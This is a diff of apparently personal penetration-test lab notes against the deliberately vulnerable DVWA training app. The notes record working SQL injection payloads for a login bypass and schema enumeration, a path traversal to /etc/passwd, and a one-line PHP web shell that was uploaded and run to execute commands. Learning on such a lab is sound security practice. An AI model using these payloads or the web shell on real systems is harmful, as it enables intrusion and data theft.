@@ -1,23 +1,50 @@
-# Phase 4: Vulnerability Analysis - SQL Injection (SQLi)
-# Confirmed vulnerability by using a single quote ('') which caused an HTTP 500 error.
-# SUCCESS: Bypassed login and enumerated all users.
+# Phase 4: Vulnerability Analysis and Exploitation
+
+# --------------------
+# SQL Injection (SQLi)
+# --------------------
+
+# Test 1: Confirm Vulnerability (Caused HTTP 500 Server Crash)
+# Payload: '
+# Output: HTTP ERROR 500
+
+# Test 2: Bypass Authentication and Enumerate All Users
 # Payload: 1' OR '1'='1' #
 # Output: Returns all users (admin, Gordon, Hack, Pablo, Bob).
+# SUCCESS: Login Bypass
 
-# SUCCESS: Determined column count (2) and extracted database information.
+# Test 3: Extract Database Version and Name (Union SQLi)
 # Payload: 1' UNION SELECT @@version, database() #
 # Output: First name: 10.6.22-MariaDB-0ubuntu0.22.04.1 | Surname: dvwa
+# SUCCESS: Database Information Extracted
 
-# Phase 4: Vulnerability Analysis - Local File Inclusion (LFI)
-# SUCCESS: Tested LFI vulnerability using path traversal.
+# Test 4: Find Tables in DVWA Schema
+# Payload: 1' UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema='dvwa' #
+# Output: Surname: security_log
+# SUCCESS: Table Enumeration
+
+# --------------------
+# Local File Inclusion (LFI)
+# --------------------
+
+# Test 5: Confirm LFI via Path Traversal
 # Payload (URL): http://192.168.10.11/dvwa/vulnerabilities/fi/?page=../../../../etc/passwd
-# Output: Blank page (confirmed LFI vulnerability present).
+# Output: BLANK PAGE
+# SUCCESS: LFI Vulnerability Confirmed
 
-# Phase 4: Vulnerability Analysis - File Upload (RCE)
+# --------------------
+# File Upload (Remote Code Execution - RCE)
+# --------------------
+
 dele@dele-VirtualBox:~/WebApp-Vuln-Assessment$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
-dele@dele-VirtualBox:~/WebApp-Vuln-Assessment$ # Uploaded shell.php via web interface.
-# Output: ../../hackable/uploads/shell_low.php succesfully uploaded!
+dele@dele-VirtualBox:~/WebApp-Vuln-Assessment$ # shell.php created locally.
 
-# SUCCESS: Executed remote command to confirm compromise.
+# Test 6: Upload PHP Shell
+# Upload via Web Form: shell.php
+# Output: ../../hackable/uploads/shell_low.php succesfully uploaded!
+# SUCCESS: Shell Uploaded
+
+# Test 7: Remote Command Execution Verification
 # Payload (URL): http://192.168.10.11/dvwa/hackable/uploads/shell_low.php?cmd=id
 # Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+# SUCCESS: RCE Confirmed as low-privilege www-data user
